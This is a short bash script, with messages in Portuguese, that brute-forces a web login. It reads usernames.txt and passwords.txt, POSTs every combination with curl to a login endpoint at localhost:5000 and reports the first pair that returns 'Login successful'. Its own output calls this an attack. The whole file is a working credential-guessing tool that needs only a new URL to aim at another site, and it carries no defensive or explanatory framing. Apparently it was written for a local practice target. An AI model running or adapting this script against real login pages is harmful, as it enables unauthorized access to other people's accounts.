#!/bin/bash

URL="http://localhost:5000/login"   
USERNAMES="usernames.txt"        
PASSWORDS="passwords.txt"       

if [[ ! -f "$USERNAMES" || ! -f "$PASSWORDS" ]]; then
  echo "Os arquivos usernames.txt ou passwords.txt não foram encontrados."
  exit 1
fi

while IFS= read -r username; do
  while IFS= read -r password; do
    echo "Tentando login com Username: $username e Password: $password"    
 
    response=$(curl -s -X POST -d "username=$username&password=$password" "$URL")    
   
    if [[ $response == *"Login successful"* ]]; then
      echo "SUCESSO! Username: $username | Password: $password"
      exit 0
    fi
  done < "$PASSWORDS"
done < "$USERNAMES"

echo "Attack finished. No combination worked."
